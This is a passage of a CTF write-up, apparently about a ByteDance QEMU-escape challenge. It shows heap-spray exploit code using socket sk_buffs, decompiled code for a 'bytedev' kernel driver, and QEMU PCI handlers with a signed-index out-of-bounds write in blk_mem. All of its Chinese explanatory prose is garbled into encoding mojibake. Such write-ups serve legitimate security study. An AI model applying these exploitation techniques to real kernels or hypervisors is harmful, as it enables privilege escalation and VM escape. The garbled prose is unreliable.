class="line"><span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å°±æ˜¯äº§ç”Ÿæ¼æ´åˆ©ç”¨æ¡ä»¶çš„æ”»å‡»ä»£ç ç‰‡æ®µã€‚</p><h2 id="QEMUåˆ†æ"><a href="#QEMUåˆ†æ" class="headerlink" title="QEMUåˆ†æ"></a>QEMUåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_device_id</span> *<span class="title">id_table</span>;</span> </span><br><span class="line">        <span class="keyword">int</span>  (*probe)  (struct pci_dev *dev, <span class="keyword">const</span> struct pci_device_id *id);   <span class="comment">/* New device inserted */</span></span><br><span class="line">        <span class="keyword">void</span> (*remove) (struct pci_dev *dev);   <span class="comment">/* Device removed (NULL if not a hot-plug capable driver) */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);      <span class="comment">/* Device suspended */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend_late) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);</span><br><span class="line">        <span class="keyword">int</span>  (*resume_early) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span>  (*resume) (struct pci_dev *dev);                   <span class="comment">/* Device woken up */</span></span><br><span class="line">        <span class="keyword">void</span> (*shutdown) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span> (*sriov_configure) (struct pci_dev *dev, <span class="keyword">int</span> num_vfs); <span class="comment">/* PF pdev */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_error_handlers</span> *<span class="title">err_handler</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device_driver</span>    <span class="title">driver</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pci_dynids</span> <span class="title">dynids</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>_pci_register_driver</code>å‡½æ•°æ³¨å†Œä¸€ä¸ªè®¾å¤‡é©±åŠ¨ï¼Œä¸Šè¿°å°±æ˜¯å¯¹åº”çš„ç»“æ„ä½“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000001E00 00                            bytedev_driver db    0                  ; DATA XREF: init_module+132â†‘o</span><br><span class="line">.data:0000000000001E00                                                                       ; cleanup_module+2Bâ†‘o</span><br><span class="line">.data:0000000000001E01 00                            db    0</span><br><span class="line">.data:0000000000001E02 00                            db    0</span><br><span class="line">.data:0000000000001E03 00                            db    0</span><br><span class="line">.data:0000000000001E04 00                            db    0</span><br><span class="line">.data:0000000000001E05 00                            db    0</span><br><span class="line">.data:0000000000001E06 00                            db    0</span><br><span class="line">.data:0000000000001E07 00                            db    0</span><br><span class="line">.data:0000000000001E08 00                            db    0</span><br><span class="line">.data:0000000000001E09 00                            db    0</span><br><span class="line">.data:0000000000001E0A 00                            db    0</span><br><span class="line">.data:0000000000001E0B 00                            db    0</span><br><span class="line">.data:0000000000001E0C 00                            db    0</span><br><span class="line">.data:0000000000001E0D 00                            db    0</span><br><span class="line">.data:0000000000001E0E 00                            db    0</span><br><span class="line">.data:0000000000001E0F 00                            db    0</span><br><span class="line">.data:0000000000001E10 03 0C 00 00 00 00 00 00       dq offset aBytedev                      ; &quot;bytedev&quot;</span><br><span class="line">.data:0000000000001E18 00 13 00 00 00 00 00 00       dq offset bytedev_ids</span><br><span class="line">.data:0000000000001E20 95 06 00 00 00 00 00 00       dq offset bytedev_pci_probe</span><br><span class="line">.data:0000000000001E28 C0 00 00 00 00 00 00 00       dq offset bytedev_pci_remove</span><br></pre></td></tr></table></figure><p>åœ¨å†…å­˜ä¸­å°±æ˜¯è¿™æ ·ï¼Œåœ¨æ³¨å†Œå‡½æ•°ä¸­ä¼šè°ƒç”¨<code>bytedev_pci_probe</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_pci_probe</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12[<span class="number">14</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v1 = <span class="number">-12</span>;</span><br><span class="line">  v12[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_DC8);</span><br><span class="line">  v3 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">2</span>], <span class="number">0xDC0</span>LL, <span class="number">0xB8</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(a1 + <span class="number">0x148</span>) = v3;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v1 = pci_enable_device(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_DF8);</span><br><span class="line">LABEL_31:</span><br><span class="line">      kfree(v4);</span><br><span class="line">      <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x3D1</span>) &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E28);</span><br><span class="line">LABEL_30:</span><br><span class="line">      pci_disable_device(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x411</span>) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E70);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = pci_request_regions(a1, <span class="string">&quot;ByteDance-CTFDevice&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_EB8);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = pci_ioremap_bar(a1, <span class="number">0LL</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x18</span>) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_EE0);</span><br><span class="line">LABEL_29:</span><br><span class="line">      pci_release_regions(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x20</span>) = *(_QWORD *)(a1 + <span class="number">0x3F8</span>);</span><br><span class="line">    raw_spin_lock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">0x100</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i;</span><br><span class="line">      <span class="keyword">if</span> ( !bytedev_minor_num[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        bytedev_minor_num[(<span class="keyword">int</span>)i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="number">-1</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    raw_spin_unlock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_F08);</span><br><span class="line">LABEL_28:</span><br><span class="line">      pci_iounmap(a1, *(_QWORD *)(v4 + <span class="number">24</span>));</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v12, <span class="number">0x40</span>uLL, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;bytedev&quot;</span>, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12[<span class="number">0</span>] = <span class="number">0x76656465747962</span>LL;</span><br><span class="line">    v8 = device_create(bytedev_class, <span class="number">0LL</span>, v7 | (bytedev_major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, v12);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v8;</span><br><span class="line">      printk(&amp;unk_F30);</span><br><span class="line">      bytedev_set_unused_minor_num(v7);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="number">32LL</span>;</span><br><span class="line">    v10 = (_DWORD *)(v4 + <span class="number">48</span>);</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v10++ = <span class="number">0</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">8</span>) = a1;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">176</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *(_QWORD *)v4 = v8;</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">16</span>) = v7;</span><br><span class="line">    bytedev_arr[v7] = v4;</span><br><span class="line">    printk(&amp;unk_F60);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°ä¸­ä½¿ç”¨äº†<code>pci_request_regions</code>å¯¹èµ„æºè¿›è¡Œäº†æ¢æµ‹å’Œå ç”¨ï¼Œå¯¼è‡´å¦‚æœç›´æ¥ä½¿ç”¨ç”¨æˆ·æ€ç¨‹åºå¯¹PCIè®¾å¤‡ä½¿ç”¨æ—¶ä¼šå¤±è´¥ï¼Œ<strong>è¿™é‡Œå¦‚æœææƒæˆåŠŸçš„è¯å¯ä»¥é€šè¿‡å¸è½½é©±åŠ¨æ¨¡å—æ¥å®ç°å–æ¶ˆå¯¹èµ„æºçš„å ç”¨ä»è€Œå¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ€ä½¿ç”¨PCIè®¾å¤‡ã€‚</strong>ä¸è¿‡é¢˜ç›®è¿™é‡Œçš„é©±åŠ¨ä¸­å·²ç»å®Œå…¨åŒ…å«äº†å¯¹PCIè®¾å¤‡çš„ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> a3; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v8; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1919810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(_QWORD *)(v4 + <span class="number">0x20</span>);</span><br><span class="line">      v8 = __indword(v7);</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        __outdword(v7 + <span class="number">1</span>, a3);</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_CE8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_BD1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x7C0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">4</span>) &amp;&amp; !*(_DWORD *)(v5 + <span class="number">0x14</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    __outdword(*(_QWORD *)(v4 + <span class="number">0x20</span>), a3);</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    printk(&amp;unk_CC0);</span><br><span class="line">LABEL_8:</span><br><span class="line">    raw_spin_unlock(v4 + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytedev_ioctl_cold_12();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œå¦‚æœä½ æƒ³è¦ä½¿ç”¨PCIè®¾å¤‡é‚£ä¹ˆä½ å¿…é¡»ä¿è¯ä¸€ç‚¹çš„æ˜¯<code>ds_0-&gt;regs.mode = 1</code>ï¼Œå› ä¸ºæ‰€æœ‰åœ°æ–¹éƒ½å­˜åœ¨è¿™ä¸ªéªŒè¯ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå°±éœ€è¦ä½¿ç”¨ioctlä¸­<code>__outdword(*(_QWORD *)(v4 + 0x20), a3);</code>è¯­å¥ã€‚è¿™é‡Œæœ€å¥½åŠ¨è°ƒä¸€ä¸‹æŸ¥çœ‹ä¸€ä¸‹<code>*(_QWORD *)(v4 + 0x20)</code>å’Œ<code>(unsigned int)&amp;current_task) + 0x7C0</code>åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œç»“æœä¼šå‘ç°è¿™é‡Œå®é™…å°±æ˜¯ä¾›æˆ‘ä»¬ä¿®æ”¹<code>ds_0-&gt;regs.mode</code>çš„å·²ç»ä¼šéªŒè¯å½“å‰æ˜¯å¦ä¸ºrootæƒé™ã€‚</p><h3 id="å‡½æ•°åˆ†æ-1"><a href="#å‡½æ•°åˆ†æ-1" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BYTEPCIDevState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 parent_obj;</span><br><span class="line">  BYTEPCIDevRegs_0 regs;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">char</span> *blk_mem[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å…ˆç»™ä¸€ä¸‹ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_pmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> blk_idx; <span class="comment">// ebx</span></span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">0xA3</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _mm_mfence();</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status != <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; (<span class="keyword">int</span>)val &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;regs.blk_idx = val;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx] )</span><br><span class="line">        &#123;</span><br><span class="line">          blk_idx = ds_0-&gt;regs.blk_idx;</span><br><span class="line">          ds_0-&gt;blk_mem[blk_idx] = (<span class="keyword">char</span> *)g_malloc(<span class="number">0x200</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( val &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;regs.mode = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨qemuä¸­çš„æ¼æ´å°±å‡ºç°åœ¨è¿™æ ·ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œåœ¨å¯¹valçš„ç±»å‹ä¸ºintç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ä¸ºè´Ÿæ•°å› ä¸º<code>blk_mem</code>ä¸ºç»“æ„ä½“ä¸­çš„ä¸€ä¸ªæˆå‘˜å¯¼è‡´å¯ä»¥å‘ä¸Šè¿›è¡Œæº¢å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_mmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">107</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status == <span class="number">2</span> &amp;&amp; size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span 